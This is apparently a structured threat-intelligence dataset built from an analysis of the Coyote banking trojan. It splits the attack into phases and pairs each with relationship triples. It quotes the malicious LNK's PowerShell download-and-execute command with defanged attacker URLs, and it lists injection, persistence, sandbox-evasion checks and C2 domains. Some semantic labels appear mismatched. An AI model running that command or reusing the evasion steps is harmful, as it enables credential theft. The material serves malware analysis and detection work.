[
    {
        "phase": "initial access",
        "content": "The LNK file executes the following PowerShell command, which connects to a remote server to initiate the next stage: -w hid -noni -ep Bypass -c \"Start-Job -Name PSSGR -ScriptBlock { IEX (iwr -Uri 'hxxps://tbet[.]geontrigame[.]com/zxchzzmism' -UseBasicParsing).Content }; Start-Sleep 131.\"\nWe analyzed multiple malicious files by examining the \"Machine ID\" embedded within the LNK files. This unique identifier provides critical insights into the system where the LNK file originated. By extracting and analyzing this metadata, we traced connections to other malicious LNK files associated with Coyote.\nThe content in \"zxchzzmism\" is an additional PowerShell script that holds two encoded data segments. This script employs specific commands to decode and execute the embedded shellcode, initiating the next phase of the malicious operation.",
        "relationship": "1. [Relationships]: <process:LNK file,executes,process:PowerShell command>. \n2. [Relationships]: <process:PowerShell command,connects,socket:hxxps://tbet[.]geontrigame[.]com/zxchzzmism>. \n3. [Relationships]: <process:PowerShell script,executes,process:shellcode>. ",
        "semantic_relationship": "[System-level Relationships]: <process:LNK file,Execute,process:PowerShell command>. \n[System-level Relationships]: <process:PowerShell command,Connect,socket:hxxps://tbet[.]geontrigame[.]com/zxchzzmism>. \n[System-level Relationships]: <process:PowerShell script,Fork,process:shellcode>. "
    },
    {
        "phase": "execution",
        "content": "The \"bmwiMcDec\" DLL file functions as a loader, utilizing VirtualAllocEx and WriteProcessMemory to inject the \"npuGDec\" payload. It then employs CreateRemoteThread to execute the injected malicious code, facilitating the continuation of the attack.\nThe injected code leverages Donut, a tool designed to decrypt and execute the final MSIL (Microsoft Intermediate Language) payloads. This ensures seamless delivery and execution of the attack's next stage.\nThe decrypted MSIL execution file first establishes persistence by modifying the registry at \"HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\" It checks for any existing PowerShell command in this registry entry. If found, it removes the existing entry and creates a new one with a randomly generated name. This new registry entry contains a customized PowerShell command pointing to download and execute a Base64-encoded URL, which facilitates the main functions of the Coyote Banking Trojan. The targeted URL for this operation is \"hxxps://yezh[.]geontrigame[.]com/vxewhcacbfqnsw.\"\nIf the victim is the new target, it gathers basic system information, such as the machine name, username, and operating system, and sends it to a remote server. It also identifies installed antivirus products by querying the SecurityCenter2 namespace in Windows Management Instrumentation (WMI). The collected data is then concatenated with a \"|\" separator, encoded in Base64, and the resulting string is reversed. This processed string is appended as a parameter and sent back to the remote server as follows: \"hxxps://yezh[.]geontrigame[.]com/hqizjs/?l=y4CMuADfvJHUgATMgM3dvRmbpdFI0Z2bz9mcjlWT8JXZk5WZmVGRgM3dvRmbpdFfzlmcoNEf0IDR0Ul(omit).\"\nAfter setting and checking in, it calls \"CreateProcess\" to execute the PowerShell command that was added into the registry to invoke the payload:",
        "relationship": "1. [Relationships]: <process:bmwiMcDec,utilizes,process:VirtualAllocEx>. \n2. [Relationships]: <process:bmwiMcDec,injects,file:npuGDec>. \n3. [Relationships]: <process:bmwiMcDec,employs,process:CreateRemoteThread>. \n4. [Relationships]: <process:Donut,decrypts,file:MSIL payloads>. \n5. [Relationships]: <process:MSIL execution file,modifies,reg:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run>. \n6. [Relationships]: <process:MSIL execution file,queries,process:SecurityCenter2>. \n7. [Relationships]: <process:MSIL execution file,calls,process:CreateProcess>. ",
        "semantic_relationship": "[System-level Relationships]: <process:bmwiMcDec,Inject,process:VirtualAllocEx>. \n[System-level Relationships]: <process:bmwiMcDec,Write,file:npuGDec>. \n[System-level Relationships]: <process:bmwiMcDec,Fork,process:CreateRemoteThread>. \n[System-level Relationships]: <process:Donut,Write,file:MSIL payloads>. \n[System-level Relationships]: <process:MSIL execution file,Writekey,reg:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run>. \n[System-level Relationships]: <process:MSIL execution file,Inject,process:SecurityCenter2>. \n[System-level Relationships]: <process:MSIL execution file,Execute,process:CreateProcess>. "
    },
    {
        "phase": "command and control",
        "content": "The payload \"vxewhcacbfqnsw\" is similar to the one downloaded from the LNK file but is noticeably larger. This increase in size is due to the inclusion of the main Coyote Baking Trojan.\nWe obtained the MSIL file after decrypting the payload from the Donut shellcode. It contained the following functions:\nUsername Checking: It examines the username to see if any of the following test/sandbox names are present: Johnson, Miller, malware, maltest, CurrentUser, Sandbox, virus, John Doe, test user, sand box, WDAGUtilityAccount, Bruno, George, and Harry Johnson. \nVirtual Management Tool Checking: It examines whether the environment contains files or folders related to virtual machines. It checks for strings in the directory \"C:\\Windows\\System32\" such as qemu-ga, qemuwmi, balloon.sys, netkvm.sys, vioinput, viofs.sys, and vioser.sys. \nBuild Targeting List: In this version, Coyote expands its target list to include 1,030 sites and 73 financial agents, including mercadobitcoin.com.br, bitcointrade.com.br, foxbit.com.br, augustoshotel.com.br, blumenhotelboutique.com.br, and fallshotel.com.br. It then starts monitoring the active window.\nCommunicate with C2: Coyote continuously monitors the active window to detect if the victim attempts to access any target sites. If a target site is accessed, it contacts the C2 server via port 443. The server list includes geraatualiza[.]com, masterdow[.]com, and geraupdate[.]com. Coyote reads a message from a remote server, processes it by decoding and cleaning the data, and prepares it for further actions based on the length of the first string in the message.",
        "relationship": "1. [Relationships]: <process:Coyote, monitors, socket:geraatualiza[.]com>. \n2. [Relationships]: <process:Coyote, monitors, socket:masterdow[.]com>. \n3. [Relationships]: <process:Coyote, monitors, socket:geraupdate[.]com>. ",
        "semantic_relationship": "[System-level Relationships]: <process:Coyote,Connect,socket:geraatualiza[.]com>. \n[System-level Relationships]: <process:Coyote,Connect,socket:masterdow[.]com>. \n[System-level Relationships]: <process:Coyote,Connect,socket:geraupdate[.]com>. "
    },
    {
        "phase_relationship": [
            {
                "phase": "initial access",
                "relationship": "[Original Relationships]: <process:LNK file,executes,process:PowerShell command>. ",
                "semantic_relationship": "[System-level Relationships]: <process:LNK file,Execute,process:PowerShell command>. "
            },
            {
                "phase": "initial access",
                "relationship": "[Original Relationships]: <process:PowerShell command,connects,socket:hxxps://tbet[.]geontrigame[.]com/zxchzzmism>. ",
                "semantic_relationship": "[System-level Relationships]: <process:PowerShell command,Connect,socket:hxxps://tbet[.]geontrigame[.]com/zxchzzmism>. "
            },
            {
                "phase": "initial access",
                "relationship": "[Original Relationships]: <process:PowerShell script,executes,process:shellcode>. ",
                "semantic_relationship": "[System-level Relationships]: <process:PowerShell script,Fork,process:shellcode>. "
            },
            {
                "phase": "execution",
                "relationship": "[Original Relationships]: <process:bmwiMcDec,utilizes,process:VirtualAllocEx>. ",
                "semantic_relationship": "[System-level Relationships]: <process:bmwiMcDec,Inject,process:VirtualAllocEx>. "
            },
            {
                "phase": "execution",
                "relationship": "[Original Relationships]: <process:bmwiMcDec,injects,file:npuGDec>. ",
                "semantic_relationship": "[System-level Relationships]: <process:bmwiMcDec,Write,file:npuGDec>. "
            },
            {
                "phase": "execution",
                "relationship": "[Original Relationships]: <process:bmwiMcDec,employs,process:CreateRemoteThread>. ",
                "semantic_relationship": "[System-level Relationships]: <process:bmwiMcDec,Fork,process:CreateRemoteThread>. "
            },
            {
                "phase": "execution",
                "relationship": "[Original Relationships]: <process:Donut,decrypts,file:MSIL payloads>. ",
                "semantic_relationship": "[System-level Relationships]: <process:Donut,Write,file:MSIL payloads>. "
            },
            {
                "phase": "execution",
                "relationship": "[Original Relationships]: <process:MSIL execution file,modifies,reg:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run>. ",
                "semantic_relationship": "[System-level Relationships]: <process:MSIL execution file,Writekey,reg:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run>. "
            },
            {
                "phase": "execution",
                "relationship": "[Original Relationships]: <process:MSIL execution file,queries,process:SecurityCenter2>. ",
                "semantic_relationship": "[System-level Relationships]: <process:MSIL execution file,Inject,process:SecurityCenter2>. "
            },
            {
                "phase": "execution",
                "relationship": "[Original Relationships]: <process:MSIL execution file,calls,process:CreateProcess>. ",
                "semantic_relationship": "[System-level Relationships]: <process:MSIL execution file,Execute,process:CreateProcess>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Original Relationships]: <process:Coyote, monitors, socket:geraatualiza[.]com>. ",
                "semantic_relationship": "[System-level Relationships]: <process:Coyote,Connect,socket:geraatualiza[.]com>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Original Relationships]: <process:Coyote, monitors, socket:masterdow[.]com>. ",
                "semantic_relationship": "[System-level Relationships]: <process:Coyote,Connect,socket:masterdow[.]com>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Original Relationships]: <process:Coyote, monitors, socket:geraupdate[.]com>. ",
                "semantic_relationship": "[System-level Relationships]: <process:Coyote,Connect,socket:geraupdate[.]com>. "
            }
        ]
    }
]